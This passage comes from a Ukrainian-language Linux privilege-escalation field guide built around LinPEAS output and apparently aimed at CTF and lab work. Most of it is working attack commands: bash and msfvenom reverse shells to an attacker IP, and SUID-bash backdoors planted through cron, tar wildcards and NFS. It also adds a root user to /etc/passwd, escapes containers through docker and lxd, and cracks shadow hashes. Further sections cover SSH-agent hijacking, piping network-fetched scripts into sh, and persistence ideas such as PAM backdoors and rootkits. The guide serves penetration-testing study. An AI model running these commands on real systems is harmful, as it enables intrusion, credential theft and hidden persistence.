# на attacker
nc -lvnp 4444
```

```bash
# на цілі
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"' >> /opt/scripts/cleanup.sh
# чекаємо до 5 хвилин
```

**Альтернатива — SUID bash через cron:**

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# чекаємо ≤5 хв
/tmp/rootbash -p
# whoami → root
```

**Cron writable directory (replace script):**

```bash
# /opt/scripts/ writable, але cleanup.sh — ні
rm /opt/scripts/cleanup.sh
cat > /opt/scripts/cleanup.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /opt/scripts/cleanup.sh
# чекаємо cron, потім: bash -p → root
```

> [!NOTE]
> Cron timing: `*/5` = кожні 5 хв; `0 0 * * *` = опівночі (можемо чекати до 24 год); `@reboot` = тільки при reboot (марно для CTF).

---

### V14 — Cron PATH manipulation 🟡

**Що шукати:**

```text
╔══════════╣ System-wide crons
/etc/crontab content:
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root  overwrite.sh    ← без абсолютного шляху!
```

> [!TIP]
> PATH у crontab починається з `/home/user` — а ми це user; "overwrite.sh" буде шукатись там першим.

**Експлуатація:**

```bash
cat > /home/user/overwrite.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /home/user/overwrite.sh
# чекаємо ≤2 хв
/bin/bash -p
# whoami → root
```

---

### V15 — Wildcard injection у cron 🔴

**Що шукати:**

```text
*/5 * * * * root cd /var/www/uploads && tar czf /backups/upl.tar.gz *
0 * * * * root chown -R www-data:www-data /var/www/html/*
```

**Експлуатація — tar checkpoint:**

```bash
ls -la /var/www/uploads
# drwxrwxrwx 2 www-data www-data ...    ← писабельний

cd /var/www/uploads
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > pwn.sh
chmod +x pwn.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh pwn.sh"

# чекаємо 5 хв
/tmp/rb -p
# id → euid=0(root)
```

---

### V16 — Writable directories у $PATH 🟡

**Що шукати:**

```text
╔══════════╣ PATH
echo $PATH: /home/user/.local/bin:/home/user/bin:/usr/local/sbin:...
/home/user/.local/bin is in PATH and writable by user
```

Сам по собі writable dir у PATH — не privesc. Але якщо там запускається SUID-бінар або privileged-process викликає команду без абсолютного шляху — privesc.

**Перевірка через pspy:**

```bash
./pspy64
# 2024/01/12 10:15:33 CMD: UID=0 PID=1235 date    ← bare command — exploit candidate!
```

> pspy показує real-time process exec — кращий за linpeas для cron monitoring.

---

## 7. Containers / Network

### V17 — Небезпечне group membership 🔴

| | |
|---|---|
| **Ціль** | privesc через привілеї групи |
| **LinPEAS секція** | `╔══════════╣ Users` та `my user info` |

**Що шукати:**

```text
╔══════════╣ My user
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo),998(docker),994(lxd)

╔══════════╣ Interesting groups my user belongs to
[+] User belongs to docker group - container escape via privileged container
[+] User belongs to lxd group - container escape via lxc image import
```

**Експлуатація — docker group:**

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami → root
# cat /etc/shadow
```

**Експлуатація — lxd / lxc group:**

```bash
# на attacker — будуємо minimal alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo ./build-alpine -a i686

# на цілі
wget http://10.10.14.X:8000/alpine-v3.x-i686.tar.gz -O alp.tar.gz
lxc image import alp.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydev disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# cd /mnt/root && cat etc/shadow
```

**Експлуатація — disk group:**

```bash
debugfs /dev/sda1
# debugfs:  cat /etc/shadow
# root:$6$xy...:18000:0:99999:7:::
```

**Інші небезпечні групи:**

| Група | Що дає |
|---|---|
| `docker` | контейнер з mount = root |
| `lxd / lxc` | контейнер з mount = root |
| `disk` | raw read/write на block devices |
| `shadow` | читання /etc/shadow |
| `video` | read /dev/fb0 — screen capture, бачимо паролі при logon |
| `adm` | read логів /var/log — інколи містять plaintext creds |
| `sudo` | privesc через sudo (Розділ 4) |
| `wheel` | RHEL еквівалент sudo group |

---

### V18 — Docker socket exposed 🔴

| | |
|---|---|
| **Ціль** | прямий talk до Docker daemon → privileged container → root |
| **LinPEAS секція** | `Searching docker.sock` та `Sockets` |

**Що шукати:**

```text
╔══════════╣ Searching docker.sock
srw-rw-rw- 1 root root 0 Jan 12 09:00 /var/run/docker.sock    ← 666 = всі!
```

**Експлуатація через docker CLI:**

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami → root
```

**Експлуатація через curl (без docker CLI):**

```bash
# 1. List images
curl --unix-socket /var/run/docker.sock http://x/images/json | python3 -m json.tool

# 2. Create privileged container з mount хоста
curl --unix-socket /var/run/docker.sock \
     -H "Content-Type: application/json" \
     -d '{"Image":"ubuntu","Cmd":["chroot","/host","sh"],"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true,"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
     http://x/containers/create

# 3. Start
curl --unix-socket /var/run/docker.sock -X POST http://x/containers/abcd1234/start

# 4. Attach
curl --unix-socket /var/run/docker.sock -X POST \
     'http://x/containers/abcd1234/attach?stream=1&stdin=1&stdout=1&stderr=1'
```

---

### V19 — NFS no_root_squash 🔴

| | |
|---|---|
| **Ціль** | з атакуючої машини як root писати у share → SUID binary на цілі |
| **LinPEAS секція** | `/etc/exports` readable |

**Що шукати:**

```text
╔══════════╣ NFS exports
/etc/exports content:
/srv/nfs    *(rw,sync,no_root_squash,no_subtree_check)
```

> [!TIP]
> `no_root_squash` = root з NFS-клієнта зберігає UID=0 на сервері; писатиму файли як root.

**Експлуатація:**

```bash
# на attacker
sudo mkdir /mnt/nfs && sudo mount -t nfs target:/srv/nfs /mnt/nfs

# створюємо SUID-бінар як root (можемо, бо no_root_squash)
sudo cat > /tmp/pwn.c <<'EOF'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/bash","bash","-p",NULL); }
EOF
sudo gcc /tmp/pwn.c -o /mnt/nfs/pwn
sudo chmod +s /mnt/nfs/pwn
```

```bash
# на цілі
/srv/nfs/pwn
# whoami → root
```

---

## 8. Credentials / Files

### V20 — Writable /etc/passwd або /etc/shadow 🔴

| | |
|---|---|
| **Ціль** | додати свого root-юзера або NOPASSWD-rule |
| **LinPEAS секція** | `Searching passwd files` + permissions |

**Що шукати:**

```text
╔══════════╣ Important writable files
/etc/passwd is writable
-rw-rw-r-- 1 root root 1234 ... /etc/passwd

/etc/shadow is readable
-rw-r--r-- 1 root root 1234 ... /etc/shadow

/etc/sudoers.d/ writable folder
```

**Експлуатація — passwd writable:**

```bash
# 1. Згенерувати crypt-хеш
openssl passwd -1 -salt salt P@ssw0rd
# $1$salt$2gK3iPxbjFqJfSdBDXVoR1

# 2. Додати root-юзера
echo 'rooot:$1$salt$2gK3iPxbjFqJfSdBDXVoR1:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Залогінитись
su rooot
# Password: P@ssw0rd
# whoami → root
```

> UID=0 + GID=0 у /etc/passwd = повний root, навіть з ім'ям "rooot".

**Експлуатація — shadow readable (crack hashes):**

```bash
cat /etc/shadow
# root:$6$xy$abc...:18000:0:99999:7:::
```

```bash
# на attacker
echo '$6$xy$abc...' > hash.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
# $6$xy$abc...:Sup3rS3cr3t!

ssh root@target
# Password: Sup3rS3cr3t!
```

**Експлуатація — sudoers.d writable:**

```bash
echo 'user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn
sudo -i
# whoami → root
```

---

### V21 — Креденшіали у history та configs 🔴

| | |
|---|---|
| **Ціль** | знайти password іншого юзера → su / sudo як він |
| **LinPEAS секція** | `Searching history files`, `Interesting files`, `Possible passwords` |

**Що шукати:**

```text
╔══════════╣ Searching passwords in history files
.bash_history:mysql -u root -pSup3rS3cr3t!
.bash_history:sshpass -p 'Welcome2023!' ssh admin@10.0.0.5
.bash_history:curl -u 'apiuser:Token123!' https://api.internal/v1

╔══════════╣ Analyzing .my.cnf files
/home/user/.my.cnf:
[client]
user=root
password=DBP@ss2023

╔══════════╣ Web files
/var/www/html/wp-config.php: define('DB_PASSWORD', 'WPpass2023!');
```

**Workflow:**

```bash
# 1. перевіряємо знайдений password — раптом це root password
su root
# Password: Sup3rS3cr3t!

# 2. Якщо не root — спробувати інших юзерів
for u in admin jeff sysadmin backup; do
  echo "trying $u..."
  echo 'Sup3rS3cr3t!' | su - $u -c 'id' 2>/dev/null
done

# 3. password reuse — на інших хостах
sshpass -p 'Sup3rS3cr3t!' ssh admin@10.0.0.5
```

**Файли, які варто перевірити вручну:**

- `~/.bash_history`, `~/.zsh_history`, `~/.python_history`
- `~/.my.cnf`, `~/.pgpass` (database creds)
- `~/.git-credentials`, `~/.netrc`
- `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/`
- `/var/www/*/wp-config.php`, `configuration.php` (CMS)
- `/etc/apache2/sites-enabled/*.conf`, `/etc/nginx/sites-enabled/*`
- `/var/backups/*`, `/opt/backups/*` — старі копії /etc/shadow
- `/var/mail/*` — пошта з temp-passwords
- `/tmp/*.sql`, `*.bak`, `*.old`

---

### V22 — SSH keys і agent socket 🔴

| | |
|---|---|
| **Ціль** | авторизуватись як інший юзер (локально або на pivot host) |
| **LinPEAS секція** | `╔══════════╣ Searching ssh files` |

**Що шукати:**

```text
╔══════════╣ Searching ssh files
/home/jeff/.ssh/id_rsa is readable: -rw-r--r-- 1 jeff jeff 1675
/home/admin/.ssh/id_ed25519 is readable: -rw-r--r-- 1 admin admin 411

╔══════════╣ Authorized keys files
/root/.ssh/authorized_keys is writable
-rw-rw-rw- 1 root root 567 ... /root/.ssh/authorized_keys
```

**Експлуатація — readable id_rsa:**

```bash
cat /home/jeff/.ssh/id_rsa > /tmp/key
# копіюємо на attacker через transparent channel
```

```bash
# на attacker
chmod 600 jeff_key
ssh -i jeff_key jeff@target
# jeff@target$ id
# uid=1001(jeff) gid=1001(jeff) groups=1001(jeff),27(sudo)    ← jeff у sudo!
# jeff@target$ sudo -i
# whoami → root
```

**Експлуатація — writable authorized_keys у /root:**

```bash
# на attacker
ssh-keygen -t rsa -f /tmp/pwn -N ''
cat /tmp/pwn.pub
# ssh-rsa AAAAB3Nz... attacker@kali
```

```bash
# на цілі
echo 'ssh-rsa AAAAB3Nz... attacker@kali' >> /root/.ssh/authorized_keys
```

```bash
# на attacker
ssh -i /tmp/pwn root@target
# root@target# whoami → root
```

**SSH agent forwarding hijack:**

```bash
ls -la /tmp/ssh-*
# drwx------ 2 jeff jeff 60 ... /tmp/ssh-XXXXabc12

# якщо ми root, можемо використати jeff's agent
SSH_AUTH_SOCK=/tmp/ssh-XXXXabc12/agent.5678 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXXabc12/agent.5678 ssh internal-host
```

**Network map через known_hosts:**

```bash
cat /home/jeff/.ssh/known_hosts
# 10.0.0.5 ssh-rsa AAAAB3...
# prod-db.internal,10.0.0.10 ssh-ed25519 AAAAC3...

cat /home/jeff/.ssh/config
# Host bastion
#     User jeff
#     IdentityFile ~/.ssh/id_rsa
# Host prod-* internal-*
#     ProxyJump bastion
```

> SSH config + known_hosts + readable id_rsa = повна network map + готовий доступ до 4+ хостів.

---

### V23 — Service config backup files (.bak/.old) 🔴

| | |
|---|---|
| **Ціль** | credentials з backup-файлу → логін у service interface → RCE як user сервісу |
| **LinPEAS секція** | `╔══════════╣ Backup files (limited 100)` |
| **Наступний крок** | читати кожен .bak конфіг сервісу → exploit interface |

Адміни часто роблять backup перед редагуванням конфігу: `cp tomcat-users.xml tomcat-users.xml.bak`. Оригінал отримує суворі permissions, а .bak копія часто залишається з default `644` — читабельна для всіх.

**Що шукати — реальний приклад:**

```text
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root  862 May  4  2025 /snap/core24/988/etc/.resolv.conf.systemd-resolved.bak
-rw-r--r-- 1 root root  893 May  4  2025 /snap/core24/988/etc/xml/catalog.old
-rw-r--r-- 1 root root  365 May  4  2025 /snap/core24/988/etc/xml/polkitd.xml.old
# ↑ snap/system .old — нецікаво, ігнорувати

-rwxr-xr-x 1 root barry 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml.bak
# ↑ ЦЕ ВОНО — конфіг сервісу з credentials

-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root  237780 Aug 26  2020 /usr/src/linux-headers.../.config.old
```

> [!TIP]
> Фільтрувати шум: ігнорувати `/snap`, `/usr/src`, `/usr/share/doc`, `/usr/share/man` — це системні; цікаве у `/etc`, `/opt`, `/var/www`, `/home`.

#### Workflow — від .bak до root

**Крок 1 — фільтр шуму, видобуття цікавих .bak/.old:**

```bash
find / \( -name "*.bak" -o -name "*.old" -o -name "*.orig" -o -name "*~" \) 2>/dev/null \
  | grep -vE '/snap/|/usr/(src|share|lib)/|/var/cache/' \
  | head -30
# /etc/tomcat9/tomcat-users.xml.bak
# /var/www/html/wp-config.php.old
# /opt/app/.env.bak
# /home/jeff/db_creds.txt~
```

**Крок 2 — читання конфігу:**

```bash
cat /etc/tomcat9/tomcat-users.xml.bak
# <?xml version="1.0" encoding="UTF-8"?>
# <tomcat-users>
#     <role rolename="manager-gui"/>
#     <role rolename="manager-script"/>
#     <user username="admin" password="Sup3rS3cr3tT0mc4t!" roles="manager-gui,manager-script"/>
# </tomcat-users>
```

> manager-gui + manager-script роль = можна заходити у Tomcat Manager web UI ТА деплоїти .war пакети.

**Крок 3 — вхід у Tomcat Manager:**

```bash
ss -tlnp | grep -E '8080|8443'
# LISTEN  0  100  *:8080  *:*

curl -u admin:Sup3rS3cr3tT0mc4t! http://127.0.0.1:8080/manager/text/list
# OK - Listed applications for virtual host [localhost]
# /:running:0:ROOT
# /manager:running:0:manager
```

**Крок 4 — згенерувати .war reverse shell payload:**

```bash
# на attacker
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f war > pwn.war
nc -lvnp 4444 &
python3 -m http.server 8000
```

**Крок 5 — upload + execute:**

```bash
# на цілі
wget http://10.10.14.X:8000/pwn.war -O /tmp/pwn.war

# deploy через manager-script API
curl -u admin:Sup3rS3cr3tT0mc4t! \
  -T /tmp/pwn.war \
  "http://127.0.0.1:8080/manager/text/deploy?path=/pwn&update=true"
# OK - Deployed application at context path [/pwn]

# trigger payload — reverse shell вилітає на attacker
curl http://127.0.0.1:8080/pwn/
```

```bash
# на attacker
nc -lvnp 4444
# listening on [any] 4444 ...
# connect to [10.10.14.X] from target
# $ id
# uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

**Крок 6 — privesc від tomcat user до root:**

```bash
# tomcat@target$
sudo -l
# User tomcat may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/busctl
```

busctl у [GTFOBins](https://gtfobins.github.io/gtfobins/busctl): викликає `$PAGER` при виводі довгих list'ів — отже PAGER=/bin/sh дає shell escape:

```bash
sudo PAGER='/bin/sh -c "exec /bin/sh 0<&1"' /usr/bin/busctl
# whoami → root

# Альтернатива:
sudo /usr/bin/busctl
# вивід пагінується через less; натиснути ! → команда → /bin/sh
# !/bin/sh
# whoami → root
```

> [!IMPORTANT]
> Це full chain з реального HTB Academy assessment: `.bak file` → tomcat creds → .war upload → shell as tomcat → busctl GTFOBins → root. 4-step privesc, кожен крок маркується LinPEAS у різних секціях (Backup files, Active Ports, sudo -l).

#### 8.4.1 Стандартні шляхи конфігів — checklist

| Сервіс | Шлях до конфіга з creds |
|---|---|
| Tomcat | `/etc/tomcat*/tomcat-users.xml`, `/usr/share/tomcat*/conf/tomcat-users.xml` |
| Apache | `/etc/apache2/.htpasswd`, `/etc/apache2/sites-enabled/*.conf` |
| nginx | `/etc/nginx/.htpasswd`, `/etc/nginx/sites-enabled/*.conf` |
| WordPress | `/var/www/html/wp-config.php` (DB_PASSWORD) |
| Joomla / Drupal | `configuration.php`, `sites/default/settings.php` |
| MySQL / MariaDB | `/etc/mysql/mariadb.conf.d/50-server.cnf`, `~/.my.cnf`, `debian.cnf` |
| PostgreSQL | `/etc/postgresql/*/main/pg_hba.conf`, `~/.pgpass` |
| Redis | `/etc/redis/redis.conf` (requirepass) |
| MongoDB | `/etc/mongod.conf`, `/var/lib/mongodb/` |
| Jenkins | `/var/lib/jenkins/secrets/*`, `credentials.xml`, `users/*/config.xml` |
| GitLab | `/etc/gitlab/gitlab.rb`, `/var/opt/gitlab/gitlab-rails/etc/secrets.yml` |
| RabbitMQ | `/etc/rabbitmq/rabbitmq.conf`, `.erlang.cookie` |
| Elasticsearch | `/etc/elasticsearch/elasticsearch.yml`, `/etc/elasticsearch/users` |
| Grafana | `/etc/grafana/grafana.ini` (admin password) |
| Confluence/Jira | `confluence.cfg.xml`, `dbconfig.xml` |
| Docker registry | `/etc/docker/registry/config.yml`, `/var/lib/registry/` |
| FileZilla server | `FileZilla Server.xml` (XML з MD5 hashes) |
| OpenVPN | `/etc/openvpn/server.conf`, `*.ovpn` client files |
| Samba | `/etc/samba/smb.conf`, `/var/lib/samba/private/passdb.tdb` |
| Generic .env | `/var/www/*/.env`, `/opt/*/.env` (Laravel, Node.js, Python apps) |

#### 8.4.2 Service-aware enumeration checklist

LinPEAS виводить запущені сервіси у трьох секціях. Workflow:

1. **Active Ports** → побачив порт (8080, 3306, 5432, 27017) → ідентифікувати сервіс
2. **Processes** → під яким юзером працює (tomcat, mysql, postgres, redis)
3. **Backup files** → шукати `*.bak`/`*.old` у стандартних шляхах сервісу
4. **Interesting files** → читати оригінал (часто фейлить через permissions) і backup (часто success)
5. **User & Groups** → перевірити, чи ми у групі того сервісу

**Bash one-liner для агресивного пошуку:**

```bash
find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.orig" \
  -o -name "*~" -o -name "*.swp" -o -name "*.save" \) 2>/dev/null \
  | grep -vE '/(snap|usr/src|usr/share|usr/lib|var/cache|proc|sys)/' \
  | xargs -I {} sh -c 'ls -la "{}" 2>/dev/null; echo'

# grep на типові password keywords у знайдених backup'ах
for f in $(find / \( -name "*.bak" -o -name "*.old" \) 2>/dev/null | grep -v /snap/); do
  grep -liE 'password|passwd|pwd|secret|token|api[_-]?key' "$f" 2>/dev/null
done
```

> [!CAUTION]
> Аналог .bak — це VCS-залишки: `.git`, `.svn` у /var/www. `git log -p | grep -i password` часто видає commit'и з accidentally committed creds, які пізніше "видалили".

---

## 9. Quick Reference — LinPEAS cheat sheet

### 9.1 Команди запуску

```bash
# Стандарт — з github прямо у sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# З локального HTTP-сервера (типовий CTF/HTB workflow)
# на attacker:
python3 -m http.server 8000
# на цілі:
curl 10.10.14.X:8000/linpeas.sh | sh

# Зберегти вивід для подальшого аналізу
./linpeas.sh -a | tee /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt    # -r зберігає кольори

# In-memory + send back (без запису на диск цілі)
# на attacker:
nc -lvnp 9002 | tee linpeas.out
# на цілі:
curl 10.10.14.X:8000/linpeas.sh | sh | nc 10.10.14.X 9002

# Без curl/wget
# на attacker:
sudo nc -q 5 -lvnp 80 < linpeas.sh
# на цілі:
cat < /dev/tcp/10.10.14.X/80 | sh
```

### 9.2 Прапорці

| Flag | Що робить |
|---|---|
| `-a` | All checks — глибша енумерація, повільніше |
| `-s` | Superfast/stealth — пропускає повільні чеки, нічого на диск |
| `-P <pass>` | Передати пароль для `sudo -l` та bruteforce інших юзерів |
| `-o <modules>` | Виконати тільки конкретні модулі |
| `-e` | Extra enumeration |
| `-q` | Quiet — без банера |
| `-N` | Без кольорів (для логів) |
| `-f <folder>` | Аналізувати конкретну директорію |
| `-L` | Linpeas-style fuzzy — regex по файлах |
| `-D` | Debug режим |

### 9.3 Кастомний білд (для stealth)

```bash
# Тільки cloud + container чеки
python3 -m builder.linpeas_builder --include "container,cloud" --output /tmp/linpeas_custom.sh

# Виключити шумні модулі
python3 -m builder.linpeas_builder --exclude "CPU_info,Sudo_version" --output /tmp/linpeas_quiet.sh
```

### 9.4 Workflow на чек-листі

1. `linpeas.sh -s` — швидкий перший прохід (5 хв)
2. Шукати у виводі `95%` — Red+Yellow знахідки
3. Перехресна перевірка з [gtfobins.github.io](https://gtfobins.github.io) для всіх SUID/sudo/cap
4. `searchsploit kernel <version>` для kernel
5. Якщо нічого — `linpeas.sh -a` повний прохід
6. Паралельно — `pspy64` для real-time process monitoring
7. Паралельно — `lse.sh` (Linux Smart Enumeration) — інша логіка
8. Якщо знайдено creds → su як інший юзер → повторити з кроку 1

---

## 10. Реальний приклад LinPEAS output

Типовий вивід LinPEAS на скомпрометованому Ubuntu 20.04 з усіма Red+Yellow знахідками:

```text
                     ╔══════════╗
             ╔═════╣ LINPEAS ╠═════╗
                     ╚══════════╝
                LinPEAS — Privesc Awesome Script

╔══════════════════════╣ Basic information ╠══════════════════════╗
OS: Linux version 5.13.0-39-generic ...
User & Groups: uid=1000(user) gid=1000(user) groups=1000(user),998(docker)
Hostname: htb-lab01

╔══════════════════════╣ System Information ╠═════════════════════╗
[+] Sudo version
   Sudo version 1.8.31
   Vulnerable to CVE-2021-3156 (Baron Samedit)

╔══════════════════════╣ Processes ╠═══════════════════════════════╗
   root  2345 0.0 mysql -u root -pSup3rS3cr3t!
   ↑ password у command line!

╔══════════════════════╣ Software Information ╠═══════════════════╗
[+] Searching specific binaries
   /usr/bin/pkexec ....> CVE-2021-4034

╔══════════════════════╣ Interesting Files ╠══════════════════════╗
[+] SUID files
   -rwsr-xr-x 1 root root  56K /usr/bin/find
   -rwsr-xr-x 1 root root  31K /usr/bin/pkexec  (CVE-2021-4034)
   -rwsr-xr-x 1 root root 184K /usr/bin/python3.8

[+] Files with capabilities
   /usr/bin/python3.8 = cap_setuid+ep
   /usr/bin/perl       = cap_setuid,cap_setgid+ep

[+] Cron jobs
   */5 * * * * root  /opt/scripts/cleanup.sh
   /opt/scripts/cleanup.sh is writable

[+] Backup files
   /etc/tomcat9/tomcat-users.xml.bak (readable!)

[+] Searching ssh files
   /home/jeff/.ssh/id_rsa is readable

[+] Mysql credentials in files
   /var/www/html/wp-config.php: define('DB_PASSWORD', 'WPpass2023!');

[+] My groups
   [!] User belongs to docker group - container escape

[+] Sudo -l output
   (ALL : ALL) NOPASSWD: /usr/bin/find
   env_keep+=LD_PRELOAD
```

### 10.1 Аналіз — 10 паралельних шляхів до root

| # | Знахідка | Вектор | Час до root |
|---|---|---|---|
| 1 | 🔴 Sudo NOPASSWD: /usr/bin/find | [V05](#v05--nopasswd-entries-) | ~5 sec |
| 2 | 🔴 env_keep+=LD_PRELOAD | [V06](#v06--ld_preload--ld_library_path-preserved-) | ~30 sec |
| 3 | 🔴 SUID /usr/bin/python3.8 | [V09](#v09--suid-на-gtfobins-) | ~5 sec |
| 4 | 🔴 SUID /usr/bin/find | [V09](#v09--suid-на-gtfobins-) | ~5 sec |
| 5 | 🔴 cap_setuid+ep on python | [V11](#v11--linux-capabilities-) | ~5 sec |
| 6 | 🔴 CVE-2021-4034 (pkexec) | [V03](#v03--pwnkit-cve-2021-4034-) | ~30 sec |
| 7 | 🔴 CVE-2021-3156 (sudo) | [V02](#v02--sudo-baron-samedit-cve-2021-3156-) | ~1 min |
| 8 | 🔴 /opt/scripts/cleanup.sh writable | [V13](#v13--writable-cron-scripts-) | ~5 min (wait) |
| 9 | 🔴 User in docker group | [V17](#v17--небезпечне-group-membership-) | ~10 sec |
| 10 | 🔴 tomcat-users.xml.bak | [V23](#v23--service-config-backup-files-bakold-) | ~2 min |
| + | 🟡 /home/jeff/.ssh/id_rsa readable | [V22](#v22--ssh-keys-і-agent-socket-) | n/a |
| + | 🟡 mysql password у processes | [V21](#v21--креденшіали-у-history-та-configs-) | n/a |

### 10.2 Найшвидший шлях — 5 секунд

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
# id → uid=0(root)
```

### 10.3 Документація знахідок для звіту

Кожна знахідка з LinPEAS = окремий finding. Структура:

- **Title:** "Privilege Escalation via SUID Python Binary"
- **Severity:** High (CVSS 7.8)
- **Affected:** /usr/bin/python3.8 на htb-lab01
- **Description:** python3.8 встановлено з SUID-бітом, дозволяючи будь-якому локальному юзеру виконати `os.setuid(0)` і отримати root-shell
- **Proof of Concept:** screenshot команди + вивід id
- **Remediation:** `chmod u-s /usr/bin/python3.8`; перевірити, які процеси полагаються на цей SUID

---

## 11. Післямова — куди йти далі

LinPEAS — найповніший інструмент для Linux privesc enumeration. Після root наступні напрямки:

### Persistence

- 🔵 SSH key у `/root/.ssh/authorized_keys` — найпростіше
- 🔵 Cron job `@reboot` з reverse shell
- 🔵 SUID backdoor — копія bash з +s (легко знаходиться)
- 🔵 systemd service з `Restart=always`
- 🔵 PAM backdoor — модифікація `/etc/pam.d/sshd`
- 🔵 Rootkit — Diamorphine, Reptile (для serious engagement)

### Lateral movement

- 🔵 SSH keys з `/root/.ssh/` — pivot до інших хостів
- 🔵 `/etc/hosts`, `arp -a`, `ss -tunap` — internal network discovery
- 🔵 Chisel / sshuttle — port forwarding для атак на internal services
- 🔵 Kerberos tickets — якщо хост у AD-домені

### Credential harvesting (post-root)

- 🔵 `/etc/shadow` — все hashes для offline crack
- 🔵 `~/.bash_history` усіх юзерів
- 🔵 SSH-agent sockets у `/tmp/ssh-*` — hijack для pivot
- 🔵 [Mimipenguin](https://github.com/huntergregal/mimipenguin) — credentials з GDM/LightDM memory
- 🔵 [LaZagne](https://github.com/AlessandroZ/LaZagne) — config files, browsers, мейл клієнти
- 🔵 `/var/log/auth.log` — інколи містить failed sudo з паролями (sysadmin typo)

### Active Directory (якщо хост у домені)

- 🔵 Linux + AD через realmd/sssd — кешовані Kerberos tickets у `/tmp/krb5cc_*`
- 🔵 SSSD database — `/var/lib/sss/db/cache_*.ldb`
- 🔵 Pass-the-Hash з Linux через impacket: `psexec.py -hashes :X user@dc01`
- 🔵 Kerberoasting з Linux — `GetUserSPNs.py` з impacket

### Container escape (якщо ми в контейнері)

- 🔵 Privileged container з cap_sys_admin → mount host's /
- 🔵 /.dockerenv exposed + Docker socket mounted → docker.sock escape
- 🔵 Kernel exploits — DirtyCOW, DirtyPipe працюють з контейнера
- 🔵 CVE-2024-21626 (runc) — file descriptor leak escape

### Cloud pivoting

```bash
aws --profile stolen sts get-caller-identity
aws --profile stolen iam list-attached-user-policies --user-name X
pacu    # AWS exploitation framework
```

---

## 📚 Корисні посилання

- 🔗 [PEASS-ng GitHub (LinPEAS)](https://github.com/peass-ng/PEASS-ng)
- 🔗 [GTFOBins](https://gtfobins.github.io) — SUID/sudo/caps escape techniques
- 🔗 [HackTricks Linux Privesc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- 🔗 [Exploit-DB](https://www.exploit-db.com)
- 🔗 [Linux Smart Enumeration (lse.sh)](https://github.com/diego-treitos/linux-smart-enumeration)
- 🔗 [pspy — process monitor](https://github.com/DominicBreuker/pspy)
- 🔗 [Sherlock — Linux kernel exploit suggester](https://github.com/sleventyeleven/linuxprivchecker)

---

> **Філософія pentest reporting:** Privesc — лише один з 4 етапів post-exploitation. Цінне для замовника не "ми отримали root", а "ми знайшли N misconfigurations, кожна з яких сама по собі = breach". У звіті важливо документувати ВСІ паралельні privesc-шляхи, а не лише той, що використали для PoC.

```text
// LinPEAS Privesc Field Guide v1.0 — happy hunting //
```
